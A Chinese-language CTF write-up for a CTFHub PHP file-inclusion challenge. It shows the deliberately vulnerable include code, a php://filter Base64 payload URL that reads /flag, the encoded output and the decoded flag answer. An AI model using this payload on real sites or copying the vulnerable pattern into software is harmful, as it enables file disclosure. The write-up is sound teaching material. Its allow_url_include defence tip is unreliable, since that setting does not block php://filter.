---
title: CTFHub 文件包含-读取源代码
date: 2026-10-22
categories: CTFHub Web 文件包含 `php://filter` 伪协议 Base64 编码
tags: CTFHub Web 文件包含 `php://filter` 伪协议 Base64 编码
---
# 题目：CTFHub 文件包含-读取源代码

## 题目描述
打开题目页面，源码如下：
```php
<?php
error_reporting(E_ALL);
if (isset($_GET['file'])) {
    if ( substr($_GET["file"], 0, 6) === "php://" ) {
        include $_GET["file"];
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>
<hr>
i don't have shell, how to get flag? <br>
flag in <code>/flag</code>
```
*分析：*
代码强制要求 file 参数的前 6 个字符必须是 php://。
页面提示 flag 在 /flag。

## 解题思路
### 漏洞原理
由于只能使用 php:// 协议，且 /flag 是纯文本文件，直接读取可能会因为浏览器解析或 PHP 代码执行导致内容被吞。
php://filter 是 PHP 中的一个元封装器，允许我们在读取文件时应用过滤器（比如 Base64 编码）。这样可以确保我们读到的是完整的原始数据。

### 攻击链
构造 php://filter/convert.base64-encode/resource=/flag。
获取 Base64 编码的字符串。
解码获取 flag。

## 解题步骤
1. 构造 Payload
在浏览器地址栏输入：
```text
http://challenge-xxx.sandbox.ctfhub.com:10800/?file=php://filter/convert.base64-encode/resource=/flag
```
2. 获取并解码 Base64
页面返回：
```text
Y3RmaHViezgxZjRhNzk5NTlkNTkzYmE2NGNhMTAzY30K
```
将其复制到 Base64 在线解码工具，解码得到：
```text
ctfhub{81f4a79959d593ba64ca103c}
```
提交 flag.

## 踩坑指南
1. 直接读取 /flag
原因： /flag 可能包含过滤字眼，或者直接读取时会被 PHP 当作代码执行，导致无法看到明文。
解决： 使用 php://filter 进行 Base64 编码读取。

## 知识点总结

| 知识点 | 说明 |
| :--- | :--- |
| `php://filter` | PHP 元封装器，用于在读写文件时进行过滤 |
| `convert.base64-encode` | 将文件内容转换为 Base64 编码 |
| 文件包含 | 通过 `include` 引入文件 |

### 防御建议
1. 禁用危险伪协议：在 php.ini 中关闭 allow_url_include。
2. 严格过滤输入：不要仅用 substr 截取判断，应使用白名单机制。> 考点：文件包含、`php://filter` 伪协议、Base64 编码
